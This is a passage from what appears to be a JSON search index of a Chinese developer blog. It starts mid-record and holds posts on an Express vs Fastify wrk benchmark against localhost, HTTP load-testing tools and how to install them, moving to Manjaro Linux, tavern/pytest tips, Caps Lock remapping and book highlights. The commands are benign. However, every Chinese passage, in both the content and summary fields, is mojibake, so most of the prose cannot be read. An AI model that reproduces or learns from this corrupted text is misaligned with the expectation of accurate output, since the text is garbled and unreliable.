","title":"1åˆ†é’Ÿå°†å¾®ä¿¡ç½‘é¡µç‰ˆè½¬ä¸ºæ¡Œé¢åº”ç”¨"},{"content":"æœºå™¨ä¿¡æ¯ï¼š4C32G æµ‹è¯•å·¥å…·ï¼šwrk Node: v14.17.0\nexpress.js\n\u0026#39;use strict\u0026#39; const express = require(\u0026#39;express\u0026#39;) const app = express() app.get(\u0026#39;/\u0026#39;, function (req, res) { res.json({ hello: \u0026#39;world\u0026#39; }) }) app.listen(3000) fastify.js\n\u0026#39;use strict\u0026#39; const fastify = require(\u0026#39;fastify\u0026#39;)() fastify.get(\u0026#39;/\u0026#39;, function (req, reply) { reply.send({ hello: \u0026#39;world\u0026#39; }) }) fastify.listen(3000) ~ æµ‹è¯•ç»“æœ # express.js Running 10s test @ http://127.0.0.1:3000 12 threads and 400 connections Thread Stats Avg Stdev Max +/- Stdev Latency 55.36ms 11.53ms 173.22ms 93.16% Req/Sec 602.58 113.03 830.00 84.97% 72034 requests in 10.10s, 17.31MB read Requests/sec: 7134.75 Transfer/sec: 1.71MB # fastify.js Running 10s test @ http://127.0.0.1:3000 12 threads and 400 connections Thread Stats Avg Stdev Max +/- Stdev Latency 16.26ms 5.73ms 105.76ms 96.26% Req/Sec 2.08k 490.82 14.63k 94.92% 249114 requests in 10.09s, 44.43MB read Requests/sec: 24688.94 Transfer/sec: 4.40MB fastifyæ˜¯expressçš„3.4å€ï¼Œ æ‰€ä»¥å¯¹æ€§èƒ½æœ‰æ‰€è¿½æ±‚çš„è¯ï¼Œæœ€å¥½ç”¨fastifyã€‚\n","permalink":"https://wdd.js.org/fe/perf-test-express-fastify/","summary":"æœºå™¨ä¿¡æ¯ï¼š4C32G æµ‹è¯•å·¥å…·ï¼šwrk Node: v14.17.0\nexpress.js\n\u0026#39;use strict\u0026#39; const express = require(\u0026#39;express\u0026#39;) const app = express() app.get(\u0026#39;/\u0026#39;, function (req, res) { res.json({ hello: \u0026#39;world\u0026#39; }) }) app.listen(3000) fastify.js\n\u0026#39;use strict\u0026#39; const fastify = require(\u0026#39;fastify\u0026#39;)() fastify.get(\u0026#39;/\u0026#39;, function (req, reply) { reply.send({ hello: \u0026#39;world\u0026#39; }) }) fastify.listen(3000) ~ æµ‹è¯•ç»“æœ # express.js Running 10s test @ http://127.0.0.1:3000 12 threads and 400 connections Thread Stats Avg Stdev Max +/- Stdev Latency 55.36ms 11.53ms 173.22ms 93.16% Req/Sec 602.","title":"Perf Test Express Fastify"},{"content":"ab Cè¯­è¨€ ä¼˜ç‚¹ å®‰è£…ç®€å• ç¼ºç‚¹ ä¸æ”¯æŒæŒ‡å®šæµ‹è¯•æ—¶é•¿ å®‰è£… # debian/ubuntu apt-get install apache2-utils # centos yum -y install httpd-tools wrk https://github.com/wg/wrk Cè¯­è¨€ ä¼˜ç‚¹ æ”¯æŒluaè„šæœ¬ wrk is a modern HTTP benchmarking tool capable of generating significant load when run on a single multi-core CPU. It combines a multithreaded design with scalable event notification systems such as epoll and kqueue. An optional LuaJIT script can perform HTTP request generation, response processing, and custom reporting. Details are available in SCRIPTING and several examples are located in scripts/.\nå®‰è£… git clone https://github.com/wg/wrk.git cd wrk make sudo ln -s $PWD/wrk /usr/bin/wrk åŸºæœ¬ä½¿ç”¨ wrk -t12 -c400 -d30s http://127.0.0.1:8080/index.html Running 30s test @ http://127.0.0.1:8080/index.html 12 threads and 400 connections Thread Stats Avg Stdev Max +/- Stdev Latency 635.91us 0.89ms 12.92ms 93.69% Req/Sec 56.20k 8.07k 62.00k 86.54% 22464657 requests in 30.00s, 17.76GB read Requests/sec: 748868.53 Transfer/sec: 606.33MB k6 k6 is a modern load testing tool, building on our years of experience in the load and performance testing industry. It provides a clean, approachable scripting API, local and cloud execution, and flexible configuration.This is how load testing should look in the 21st century.\nhttps://github.com/k6io/k6 goè¯­è¨€å¼€å‘ ä¼˜ç‚¹ æ”¯æŒä½¿ç”¨è„šæœ¬å¼€å‘æµ‹è¯• åŠŸèƒ½å¼ºå¤§ \u0026hellip;\u0026hellip; æ”¯æŒå°†æµ‹è¯•ç»“æœç›´æ¥å†™å…¥influxdb, è¿™æ˜¯äº®ç‚¹å•Š ç¼ºç‚¹ å¦‚æœä½ åªæƒ³ç”¨å‡ ä¸ªå‚æ•°æ¥æµ‹è¯•æ¥å£ï¼Œå¤§å¯ä¸å¿…ç”¨k6 å®‰è£… # macos brew install k6 // å…¶ä»–å¹³å°ä¹Ÿæ˜¯æ”¯æŒçš„ï¼Œå‚è€ƒå®˜æ–¹æ–‡æ¡£ autocannon Javascript/Node.js https://github.com/mcollina/autocannon ä¼˜ç‚¹ å¦‚æœä½ æ˜¯Node.jså¼€å‘è€…ï¼Œå®‰è£…autocannonæ˜¯éå¸¸ç®€å•çš„ å®‰è£… npm i autocannon -g ä½¿ç”¨ ali https://github.com/nakabonne/ali goè¯­è¨€å¼€å‘ ç‰¹ç‚¹ æ”¯æŒè‡ªåŠ¨åœ¨æ§åˆ¶å°ç»˜å›¾ å®‰è£… brew install nakabonne/ali/ali ","permalink":"https://wdd.js.org/posts/2021/05/fxv15g/","summary":"ab Cè¯­è¨€ ä¼˜ç‚¹ å®‰è£…ç®€å• ç¼ºç‚¹ ä¸æ”¯æŒæŒ‡å®šæµ‹è¯•æ—¶é•¿ å®‰è£… # debian/ubuntu apt-get install apache2-utils # centos yum -y install httpd-tools wrk https://github.com/wg/wrk Cè¯­è¨€ ä¼˜ç‚¹ æ”¯æŒluaè„šæœ¬ wrk is a modern HTTP benchmarking tool capable of generating significant load when run on a single multi-core CPU. It combines a multithreaded design with scalable event notification systems such as epoll and kqueue. An optional LuaJIT script can perform HTTP request generation, response processing, and custom reporting.","title":"5ä¸ªæ¥å£å‹åŠ›æµ‹è¯•å·¥å…·"},{"content":"overview æˆ‘ä¸»è¦ä½¿ç”¨è¿‡4ä¸ªæ“çºµç³»ç»Ÿã€‚windows,macos,ubuntu,manjaroï¼Œæ¯ä¸ªæ“ä½œç³»ç»Ÿï¼Œæˆ‘éƒ½æœ‰ä¸Šå¹´æˆ–è€…ä¸Šæœˆçš„ä½¿ç”¨ä½“ä¼šã€‚\nå¦‚æœä½ æ˜¯æ™®é€šç”¨æˆ·ï¼Œæ— è®ºå·¥ä½œè¿˜æ˜¯å­¦ä¹ ï¼Œéƒ½ä¸æ¶‰åŠåˆ°å†™ä»£ç çš„è¯ã€‚windowså’Œmacæ˜¯æœ€å¥½çš„é€‰æ‹©ï¼Œå¦‚æœä½ æ˜¯ä¸€åå¼€å‘äººå‘˜ï¼Œé‚£ä¹ˆmacos,ubuntuå’Œmanjaroéƒ½æ˜¯å¯ä»¥é€‰æ‹©çš„ã€‚\næˆ‘æ˜¯ä¸€ä¸ªå¾ˆå®¹æ˜“æ¥å—æ“åˆ‡æ¢ä½œç³»ç»Ÿæ”¹å˜çš„äººï¼Œä»æ¯ä¸ªç³»ç»Ÿä¸Šæˆ‘éƒ½å¯ä»¥å¾ˆé¡ºç•…çš„åˆ‡æ¢ã€‚ä½†æ˜¯å¹¶ä¸æ˜¯æ‰€æœ‰äººéƒ½æ˜¯å¦‚æ­¤ï¼Œæœ‰äº›äººå³ä½¿ç”¨äº†ä¸€å¹´å¤šçš„macï¼Œè¿˜æ˜¯æ— æ³•æ¥å—ï¼Œæœ€ç»ˆåˆæ¢å›äº†windowsã€‚\nchangelog å¤§å­¦åˆ°å·¥ä½œç¬¬ä¸€å¹´ï¼Œæˆ‘ä¸€ç›´ç”¨windowsï¼Œæ»¡è¶³å„ç§éœ€æ±‚ å·¥ä½œç¬¬äºŒå¹´ï¼Œæˆ‘æ¢äº†macã€‚å› ä¸ºæˆ‘æƒ³è½»ä¾¿çš„ç¬”è®°æœ¬ï¼Œå¦å¤–ä¹Ÿæƒ³å°å°é²œã€‚macçš„å±å¹•ã€ç•Œé¢UIã€è§¦æ‘¸æ¿éƒ½æ˜¯å€¼å¾—ç§°é“çš„åœ°æ–¹ï¼Œé”®ç›˜ä½“éªŒå°±ä¸è¶³äººæ„äº†ã€‚ ä»macåˆ‡æ¢åˆ°ubuntu, macbookä½¿ç”¨æ¥è¿‘4å¹´äº†ã€‚æ˜æ˜¾æ„Ÿè§‰åˆ°ä¸€äº›æ€§èƒ½ä¸Šçš„ä¸è¶³ï¼Œåˆšå¥½åˆå‘ç°ä¸€å°ç©ºé—²çš„å°å¼æœºæ²¡äººç”¨ï¼Œå°å¼æœºæ€§èƒ½ä¸é”™ï¼Œä¹‹å‰æ˜¯åšæœåŠ¡å™¨çš„ï¼ŒCPUã€å†…å­˜ã€ç£ç›˜èµ„æºéƒ½æ¯”è¾ƒä¸°å¯Œã€‚ç„¶åæˆ‘å°±åœ¨ä¸Šé¢å®‰è£…äº†ubuntuã€‚ç³»ç»Ÿçš„åˆå§‹åŒ–è½¯ä»¶å®‰è£…æœ‰äº›æŠ˜è…¾äººï¼Œè¦å®‰è£…ä¸­æ–‡è¾“å…¥æ³•ï¼Œå¸¸è§çš„è½¯ä»¶ä¾‹å¦‚å¾®ä¿¡å’ŒQQ, å®‰è£…è¿˜æ˜¯æœ‰äº›éš¾åº¦çš„ã€‚ubuntuåˆšå¼€å§‹ä½¿ç”¨è¿˜æ˜¯æ¯”è¾ƒæµç•…çš„ï¼Œä½†æ˜¯æ¥ä¸‹æ¥é‡åˆ°éå¸¸è‡´å‘½çš„é—®é¢˜ï¼ŒUIç»å¸¸å¡æ­»ã€‚æŸ¥ä¸‹æ¥å‘ç°å’ŒXorgä»¥åŠç³»ç»Ÿçš„æ˜¾å¡æœ‰å…³ï¼Œç½‘ä¸Šæœäº†ä¸‹ï¼Œå¾ˆå¤šäººé‡åˆ°ç±»ä¼¼çš„é—®é¢˜ï¼Œä¹Ÿå°è¯•äº†ä¸€äº›è§£å†³æ–¹æ¡ˆï¼Œä½†æ˜¯è¿˜æ˜¯æ— æ³•è§£å†³ã€‚ç´¢æ€§æˆ‘å°±å…³äº†ubuntuçš„å›¾å½¢ç•Œé¢ï¼Œä»…ä»…sshè¿œç¨‹å¼€å‘ã€‚ ä»ubuntuåˆ‡æ¢åˆ°macos, æ¢å¤åˆ°ä¹‹å‰çš„çŠ¶æ€ï¼Œæ„Ÿè§‰å¾ˆå¥½ã€‚ä½†æ˜¯çœ‹åˆ°macbook proä¸Šæ¥çš„æ‰©å±•åï¼Œä»¥åŠè¢«å„ç§çº¿ç¼†é«˜çš„ä¹±ç³Ÿç³Ÿçš„æ¡Œé¢ï¼Œæƒ³å°è¯•å…¶ä»–Linuxå‘è¡Œç‰ˆçš„æƒ³æ³•åˆåœ¨å¿ƒé‡Œæ‚„æ‚„å‘äº†èŠ½ï¼Œä¸€è·¯ç–¯é•¿ã€‚ é“é™¤äº†ubuntu, å°±æ²¡æœ‰å…¶ä»–é€‰æ‹©äº†å—ï¼Ÿè°ƒç ”ä¸€ç•ªï¼Œå‘ç°äº†manjaroè¿™ä¸ªå‘è¡Œç‰ˆï¼Œç”¨æˆ·è¯„ä»·å¾ˆä¸é”™ã€‚ç„¶åæˆ‘å°±è¯•è¯•çœ‹ï¼Œç»“æœå‘ç°å®‰è£…å„ç§è½¯ä»¶æ¯”ubuntuæ–¹ä¾¿å¤šäº†ï¼Œè¯•ç”¨äº†å‡ å¤©ï¼Œä¹Ÿæ˜¯è¶Šæ¥è¶Šå–œæ¬¢ã€‚åˆå‘ç°äº†ä¸€ä¸ªå®è—å‘è¡Œç‰ˆã€‚ å…¶å®æˆ‘ä¸€ç›´å¯¹manjaroè¿™ä¸ªå•è¯åˆå¾ˆå¤§çš„å¥½å¥‡ï¼Œè¿™ä¸ªè‹±æ–‡åæ˜¯ä»€ä¹ˆæ„æ€å‘¢ï¼Ÿè¯å…¸ä¸Šæ²¡æœ‰å¯¹è¿™ä¸ªè‹±æ–‡è¯çš„ä»‹ç»ï¼Œåªæ˜¯è¯´æ˜¯ä¸€ä¸ªlinuxå‘è¡Œç‰ˆã€‚ manjaro ä»€ä¹ˆæ„æ€ï¼Ÿå¦‚ä½•å‘éŸ³ï¼Ÿ marjaroè¿™ä¸ªè¯æ¥è‡ªkilimanjaro, ä¹åŠ›é©¬æ‰ç½—æ˜¯éæ´²æœ€é«˜çš„é«˜å±±ï¼Œè¿™åº§å±±æ˜¯ç”±äºç«å±±çˆ†å‘æ‰€äº§ç”Ÿçš„ï¼Œè¿™ä¸ªå¯èƒ½æ¯”è¾ƒè´´åˆmarjaroçš„æ»šåŠ¨å‘å¸ƒçš„ç‰¹ç‚¹ï¼Œä¹Ÿè¯´æ˜è¿™ä¸ªå‘è¡Œç‰ˆæ˜¯æ¯”è¾ƒæ´»è·ƒçš„å§ã€‚\nAlthough the inspiration for the name originates from Mount Kilimanjaro, it may be pronounced as \u0026lsquo;Man-jar-o\u0026rsquo; or as \u0026lsquo;Man-ha-ro\u0026rsquo;. https://wiki.manjaro.org/index.php/Manjaro_FAQ\nä¹åŠ›é©¬æ‰ç½—å±±ï¼ˆæ–¯ç“¦è¥¿é‡Œè¯­ï¼šKilimanjaroï¼Œæ„ä¸ºâ€œç¿çƒ‚å‘å…‰çš„å±±â€ï¼‰ä½äºå¦æ¡‘å°¼äºšä¸œåŒ—çš„ä¹åŠ›é©¬æ‰ç½—åŒºï¼Œä¸´è¿‘è‚¯å°¼äºšè¾¹ç•Œï¼Œæ˜¯éæ´²çš„æœ€é«˜å±±ï¼Œå¸¸è¢«ç§°ä¸ºâ€œéæ´²å±‹è„Šâ€ã€â€œéæ´²ä¹‹ç‹â€ã€‚å…¶æœ€é«˜å³°ä¸ºåŸºåšå³°ï¼ˆä¹Ÿç§°ä¹Œå‘¼é²å³°ï¼‰ï¼Œæµ·æ‹”5895ç±³ã€‚\nmanjaroå‘è¡Œç‰ˆçš„ç‰¹ç‚¹ å›¾å½¢åŒ–å®‰è£…ç•Œé¢ï¼Œéå¸¸æ–¹ä¾¿ è‡ªå¸¦å›¾å½¢ç•Œé¢ è‡ªåŠ¨ç¡¬ä»¶æ£€æµ‹ï¼Œå›¾å½¢åŒ–æ”¯æŒåšçš„æ¯”ubuntuå¥½å¤ªå¤š æ»šåŠ¨æ›´æ–° éå¸¸å¤šçš„åŒ…ï¼Œå¯ä»¥ä½¿ç”¨AURæ¥å®‰è£…åŒ… ç›¸æ¯”ä¸Arch, manjaroå¯¹æ–°æ‰‹éå¸¸å‹å¥½ å‚è€ƒ https://manjaro.org/terms-of-use/ Developed in Austria, France, and Germany, Manjaro provides all the benefits of the Arch operating system combined with a focus on user-friendliness and accessibility. https://wiki.manjaro.org/index.php/About_Manjaro\nhttps://wiki.manjaro.org/index.php/Manjaro:A_Different_Kind_of_Beast https://wiki.manjaro.org/index.php/Manjaro_FAQ https://wiki.manjaro.org/index.php/Main_Page https://wiki.manjaro.org/index.php/Using_Manjaro_for_Beginners ","permalink":"https://wdd.js.org/posts/2021/05/cntrwh/","summary":"overview æˆ‘ä¸»è¦ä½¿ç”¨è¿‡4ä¸ªæ“çºµç³»ç»Ÿã€‚windows,macos,ubuntu,manjaroï¼Œæ¯ä¸ªæ“ä½œç³»ç»Ÿï¼Œæˆ‘éƒ½æœ‰ä¸Šå¹´æˆ–è€…ä¸Šæœˆçš„ä½¿ç”¨ä½“ä¼šã€‚\nå¦‚æœä½ æ˜¯æ™®é€šç”¨æˆ·ï¼Œæ— è®ºå·¥ä½œè¿˜æ˜¯å­¦ä¹ ï¼Œéƒ½ä¸æ¶‰åŠåˆ°å†™ä»£ç çš„è¯ã€‚windowså’Œmacæ˜¯æœ€å¥½çš„é€‰æ‹©ï¼Œå¦‚æœä½ æ˜¯ä¸€åå¼€å‘äººå‘˜ï¼Œé‚£ä¹ˆmacos,ubuntuå’Œmanjaroéƒ½æ˜¯å¯ä»¥é€‰æ‹©çš„ã€‚\næˆ‘æ˜¯ä¸€ä¸ªå¾ˆå®¹æ˜“æ¥å—æ“åˆ‡æ¢ä½œç³»ç»Ÿæ”¹å˜çš„äººï¼Œä»æ¯ä¸ªç³»ç»Ÿä¸Šæˆ‘éƒ½å¯ä»¥å¾ˆé¡ºç•…çš„åˆ‡æ¢ã€‚ä½†æ˜¯å¹¶ä¸æ˜¯æ‰€æœ‰äººéƒ½æ˜¯å¦‚æ­¤ï¼Œæœ‰äº›äººå³ä½¿ç”¨äº†ä¸€å¹´å¤šçš„macï¼Œè¿˜æ˜¯æ— æ³•æ¥å—ï¼Œæœ€ç»ˆåˆæ¢å›äº†windowsã€‚\nchangelog å¤§å­¦åˆ°å·¥ä½œç¬¬ä¸€å¹´ï¼Œæˆ‘ä¸€ç›´ç”¨windowsï¼Œæ»¡è¶³å„ç§éœ€æ±‚ å·¥ä½œç¬¬äºŒå¹´ï¼Œæˆ‘æ¢äº†macã€‚å› ä¸ºæˆ‘æƒ³è½»ä¾¿çš„ç¬”è®°æœ¬ï¼Œå¦å¤–ä¹Ÿæƒ³å°å°é²œã€‚macçš„å±å¹•ã€ç•Œé¢UIã€è§¦æ‘¸æ¿éƒ½æ˜¯å€¼å¾—ç§°é“çš„åœ°æ–¹ï¼Œé”®ç›˜ä½“éªŒå°±ä¸è¶³äººæ„äº†ã€‚ ä»macåˆ‡æ¢åˆ°ubuntu, macbookä½¿ç”¨æ¥è¿‘4å¹´äº†ã€‚æ˜æ˜¾æ„Ÿè§‰åˆ°ä¸€äº›æ€§èƒ½ä¸Šçš„ä¸è¶³ï¼Œåˆšå¥½åˆå‘ç°ä¸€å°ç©ºé—²çš„å°å¼æœºæ²¡äººç”¨ï¼Œå°å¼æœºæ€§èƒ½ä¸é”™ï¼Œä¹‹å‰æ˜¯åšæœåŠ¡å™¨çš„ï¼ŒCPUã€å†…å­˜ã€ç£ç›˜èµ„æºéƒ½æ¯”è¾ƒä¸°å¯Œã€‚ç„¶åæˆ‘å°±åœ¨ä¸Šé¢å®‰è£…äº†ubuntuã€‚ç³»ç»Ÿçš„åˆå§‹åŒ–è½¯ä»¶å®‰è£…æœ‰äº›æŠ˜è…¾äººï¼Œè¦å®‰è£…ä¸­æ–‡è¾“å…¥æ³•ï¼Œå¸¸è§çš„è½¯ä»¶ä¾‹å¦‚å¾®ä¿¡å’ŒQQ, å®‰è£…è¿˜æ˜¯æœ‰äº›éš¾åº¦çš„ã€‚ubuntuåˆšå¼€å§‹ä½¿ç”¨è¿˜æ˜¯æ¯”è¾ƒæµç•…çš„ï¼Œä½†æ˜¯æ¥ä¸‹æ¥é‡åˆ°éå¸¸è‡´å‘½çš„é—®é¢˜ï¼ŒUIç»å¸¸å¡æ­»ã€‚æŸ¥ä¸‹æ¥å‘ç°å’ŒXorgä»¥åŠç³»ç»Ÿçš„æ˜¾å¡æœ‰å…³ï¼Œç½‘ä¸Šæœäº†ä¸‹ï¼Œå¾ˆå¤šäººé‡åˆ°ç±»ä¼¼çš„é—®é¢˜ï¼Œä¹Ÿå°è¯•äº†ä¸€äº›è§£å†³æ–¹æ¡ˆï¼Œä½†æ˜¯è¿˜æ˜¯æ— æ³•è§£å†³ã€‚ç´¢æ€§æˆ‘å°±å…³äº†ubuntuçš„å›¾å½¢ç•Œé¢ï¼Œä»…ä»…sshè¿œç¨‹å¼€å‘ã€‚ ä»ubuntuåˆ‡æ¢åˆ°macos, æ¢å¤åˆ°ä¹‹å‰çš„çŠ¶æ€ï¼Œæ„Ÿè§‰å¾ˆå¥½ã€‚ä½†æ˜¯çœ‹åˆ°macbook proä¸Šæ¥çš„æ‰©å±•åï¼Œä»¥åŠè¢«å„ç§çº¿ç¼†é«˜çš„ä¹±ç³Ÿç³Ÿçš„æ¡Œé¢ï¼Œæƒ³å°è¯•å…¶ä»–Linuxå‘è¡Œç‰ˆçš„æƒ³æ³•åˆåœ¨å¿ƒé‡Œæ‚„æ‚„å‘äº†èŠ½ï¼Œä¸€è·¯ç–¯é•¿ã€‚ é“é™¤äº†ubuntu, å°±æ²¡æœ‰å…¶ä»–é€‰æ‹©äº†å—ï¼Ÿè°ƒç ”ä¸€ç•ªï¼Œå‘ç°äº†manjaroè¿™ä¸ªå‘è¡Œç‰ˆï¼Œç”¨æˆ·è¯„ä»·å¾ˆä¸é”™ã€‚ç„¶åæˆ‘å°±è¯•è¯•çœ‹ï¼Œç»“æœå‘ç°å®‰è£…å„ç§è½¯ä»¶æ¯”ubuntuæ–¹ä¾¿å¤šäº†ï¼Œè¯•ç”¨äº†å‡ å¤©ï¼Œä¹Ÿæ˜¯è¶Šæ¥è¶Šå–œæ¬¢ã€‚åˆå‘ç°äº†ä¸€ä¸ªå®è—å‘è¡Œç‰ˆã€‚ å…¶å®æˆ‘ä¸€ç›´å¯¹manjaroè¿™ä¸ªå•è¯åˆå¾ˆå¤§çš„å¥½å¥‡ï¼Œè¿™ä¸ªè‹±æ–‡åæ˜¯ä»€ä¹ˆæ„æ€å‘¢ï¼Ÿè¯å…¸ä¸Šæ²¡æœ‰å¯¹è¿™ä¸ªè‹±æ–‡è¯çš„ä»‹ç»ï¼Œåªæ˜¯è¯´æ˜¯ä¸€ä¸ªlinuxå‘è¡Œç‰ˆã€‚ manjaro ä»€ä¹ˆæ„æ€ï¼Ÿå¦‚ä½•å‘éŸ³ï¼Ÿ marjaroè¿™ä¸ªè¯æ¥è‡ªkilimanjaro, ä¹åŠ›é©¬æ‰ç½—æ˜¯éæ´²æœ€é«˜çš„é«˜å±±ï¼Œè¿™åº§å±±æ˜¯ç”±äºç«å±±çˆ†å‘æ‰€äº§ç”Ÿçš„ï¼Œè¿™ä¸ªå¯èƒ½æ¯”è¾ƒè´´åˆmarjaroçš„æ»šåŠ¨å‘å¸ƒçš„ç‰¹ç‚¹ï¼Œä¹Ÿè¯´æ˜è¿™ä¸ªå‘è¡Œç‰ˆæ˜¯æ¯”è¾ƒæ´»è·ƒçš„å§ã€‚\nAlthough the inspiration for the name originates from Mount Kilimanjaro, it may be pronounced as \u0026lsquo;Man-jar-o\u0026rsquo; or as \u0026lsquo;Man-ha-ro\u0026rsquo;. https://wiki.manjaro.org/index.php/Manjaro_FAQ\nä¹åŠ›é©¬æ‰ç½—å±±ï¼ˆæ–¯ç“¦è¥¿é‡Œè¯­ï¼šKilimanjaroï¼Œæ„ä¸ºâ€œç¿çƒ‚å‘å…‰çš„å±±â€ï¼‰ä½äºå¦æ¡‘å°¼äºšä¸œåŒ—çš„ä¹åŠ›é©¬æ‰ç½—åŒºï¼Œä¸´è¿‘è‚¯å°¼äºšè¾¹ç•Œï¼Œæ˜¯éæ´²çš„æœ€é«˜å±±ï¼Œå¸¸è¢«ç§°ä¸ºâ€œéæ´²å±‹è„Šâ€ã€â€œéæ´²ä¹‹ç‹â€ã€‚å…¶æœ€é«˜å³°ä¸ºåŸºåšå³°ï¼ˆä¹Ÿç§°ä¹Œå‘¼é²å³°ï¼‰ï¼Œæµ·æ‹”5895ç±³ã€‚\nmanjaroå‘è¡Œç‰ˆçš„ç‰¹ç‚¹ å›¾å½¢åŒ–å®‰è£…ç•Œé¢ï¼Œéå¸¸æ–¹ä¾¿ è‡ªå¸¦å›¾å½¢ç•Œé¢ è‡ªåŠ¨ç¡¬ä»¶æ£€æµ‹ï¼Œå›¾å½¢åŒ–æ”¯æŒåšçš„æ¯”ubuntuå¥½å¤ªå¤š æ»šåŠ¨æ›´æ–° éå¸¸å¤šçš„åŒ…ï¼Œå¯ä»¥ä½¿ç”¨AURæ¥å®‰è£…åŒ… ç›¸æ¯”ä¸Arch, manjaroå¯¹æ–°æ‰‹éå¸¸å‹å¥½ å‚è€ƒ https://manjaro.org/terms-of-use/ Developed in Austria, France, and Germany, Manjaro provides all the benefits of the Arch operating system combined with a focus on user-friendliness and accessibility.","title":"åˆå‘ç°äº†ä¸€ä¸ªå®è—linuxå‘è¡Œç‰ˆ manjaro"},{"content":"è·å–ç¯å¢ƒå˜é‡ Authorization: \u0026#34;Basic {tavern.env_vars.SECRET_CI_COMMIT_AUTH}\u0026#34; x-www-form-urlencoded request: url: \u0026#34;{test_host}/form_data\u0026#34; method: POST data: id: abc123 æŒ‰ç…§nameè¿‡æ»¤è¿è¡Œæµ‹è¯• -k This can then be selected with the -k flag to pytest - e.g. pass pytest-kfake to run all tests with â€˜fakeâ€™ in the name.\næ¯”å¦‚åªè¿è¡Œåç§°åŒ…å«fakeçš„æµ‹è¯•\npy.test -k fake ","permalink":"https://wdd.js.org/posts/2021/05/xneq08/","summary":"è·å–ç¯å¢ƒå˜é‡ Authorization: \u0026#34;Basic {tavern.env_vars.SECRET_CI_COMMIT_AUTH}\u0026#34; x-www-form-urlencoded request: url: \u0026#34;{test_host}/form_data\u0026#34; method: POST data: id: abc123 æŒ‰ç…§nameè¿‡æ»¤è¿è¡Œæµ‹è¯• -k This can then be selected with the -k flag to pytest - e.g. pass pytest-kfake to run all tests with â€˜fakeâ€™ in the name.\næ¯”å¦‚åªè¿è¡Œåç§°åŒ…å«fakeçš„æµ‹è¯•\npy.test -k fake ","title":"tavern"},{"content":"å¤§å†™é”å®šé”®ä¸€èˆ¬éƒ½æ˜¯éå¸¸é¸¡è‚‹çš„åŠŸèƒ½ã€‚\nä»…ä»…ä¸€æ¬¡ç”Ÿæ•ˆ setxkbmap -option caps:escape å¤§å†™é”å®šé”®æ”¹ä¸ºesc setxkbmap -option ctrl:nocaps å¤§å†™é”å®šé”®æ”¹ä¸ºctrl æ°¸ä¹…ç”Ÿæ•ˆ /etc/X11/xorg.conf.d/90-custom-kbd.conf Section \u0026#34;InputClass\u0026#34; Identifier \u0026#34;keyboard defaults\u0026#34; MatchIsKeyboard \u0026#34;on\u0026#34; Option \u0026#34;XKbOptions\u0026#34; \u0026#34;caps:escape\u0026#34; EndSection æ³¨é”€æˆ–è€…é‡å¯åç”Ÿæ•ˆ\nhttps://superuser.com/questions/566871/how-to-map-the-caps-lock-key-to-escape-key-in-arch-linuxhttps://wiki.archlinux.org/title/X_keyboard_extension\n","permalink":"https://wdd.js.org/posts/2021/05/eafyk8/","summary":"å¤§å†™é”å®šé”®ä¸€èˆ¬éƒ½æ˜¯éå¸¸é¸¡è‚‹çš„åŠŸèƒ½ã€‚\nä»…ä»…ä¸€æ¬¡ç”Ÿæ•ˆ setxkbmap -option caps:escape å¤§å†™é”å®šé”®æ”¹ä¸ºesc setxkbmap -option ctrl:nocaps å¤§å†™é”å®šé”®æ”¹ä¸ºctrl æ°¸ä¹…ç”Ÿæ•ˆ /etc/X11/xorg.conf.d/90-custom-kbd.conf Section \u0026#34;InputClass\u0026#34; Identifier \u0026#34;keyboard defaults\u0026#34; MatchIsKeyboard \u0026#34;on\u0026#34; Option \u0026#34;XKbOptions\u0026#34; \u0026#34;caps:escape\u0026#34; EndSection æ³¨é”€æˆ–è€…é‡å¯åç”Ÿæ•ˆ\nhttps://superuser.com/questions/566871/how-to-map-the-caps-lock-key-to-escape-key-in-arch-linuxhttps://wiki.archlinux.org/title/X_keyboard_extension","title":"å¤§å†™é”å®šé”®æ˜ å°„ä¸ºescape"},{"content":"ç¬”è®°æœ¬å¯¼å‡ºç‰›æ´¥é€šè¯†è¯»æœ¬ï¼šæ•°å­¦ï¼ˆä¸­æ–‡ç‰ˆï¼‰è’‚è«è¥¿Â·é«˜å°”æ–¯\nç¬¬äºŒç«  æ•°ä¸æŠ½è±¡æ ‡æ³¨(é»„è‰²) - ä½ç½® 483é‡è¦çš„åªæ˜¯å®ƒä»¬æ‰€éµå¾ªçš„è§„åˆ™ã€‚æ ‡æ³¨(é»„è‰²) - ä½ç½® 486æˆ‘ä»¬é€šè¿‡æ¥å— iä½œå‡ºå°å°çš„æŠ•èµ„ï¼Œç»“æœå¾—åˆ°äº†è®¸å¤šå€çš„å›æŠ¥ã€‚\n","permalink":"https://wdd.js.org/posts/2021/05/wsoivr/","summary":"ç¬”è®°æœ¬å¯¼å‡ºç‰›æ´¥é€šè¯†è¯»æœ¬ï¼šæ•°å­¦ï¼ˆä¸­æ–‡ç‰ˆï¼‰è’‚è«è¥¿Â·é«˜å°”æ–¯\nç¬¬äºŒç«  æ•°ä¸æŠ½è±¡æ ‡æ³¨(é»„è‰²) - ä½ç½® 483é‡è¦çš„åªæ˜¯å®ƒä»¬æ‰€éµå¾ªçš„è§„åˆ™ã€‚æ ‡æ³¨(é»„è‰²) - ä½ç½® 486æˆ‘ä»¬é€šè¿‡æ¥å— iä½œå‡ºå°å°çš„æŠ•èµ„ï¼Œç»“æœå¾—åˆ°äº†è®¸å¤šå€çš„å›æŠ¥ã€‚","title":"ç‰›æ´¥é€šè¯†è¯»æœ¬ï¼šæ•°å­¦ï¼ˆä¸­æ–‡ç‰ˆï¼‰ç¬”è®°"},{"content":"ç¬¬ä¸€ç«  äººç”Ÿçš„èµ·ç‚¹æ ‡æ³¨(é»„è‰²) - ä½ç½® 44ä»–å¯¹æˆ‘è¯´ï¼Œåªæœ‰é‚£äº›ç©·åˆ°èµ°æŠ•æ— è·¯ï¼Œæˆ–å¿ƒæ€€å¤§å¿—çš„å·¨å¯Œï¼Œæ‰ä¼šé€‰æ‹©å‡ºæµ·å†’é™©ï¼Œæƒ³è®©è‡ªå·±ä»¥éå‡¡çš„äº‹ä¸šæ‰¬åäºä¸–ã€‚\nèµ°æŠ•æ— è·¯çš„ç©·äººå‰©ä¸‹çš„åªæ˜¯ä½œä¸ºåŠ¨ç‰©çš„æœ¬èƒ½ï¼Œæ€ä¹ˆå¯èƒ½å’Œå¿ƒæ€€å¤§å¿—çš„å·¨å¯Œç›¸æå¹¶è®ºå‘¢\næ ‡æ³¨(é»„è‰²) - ä½ç½® 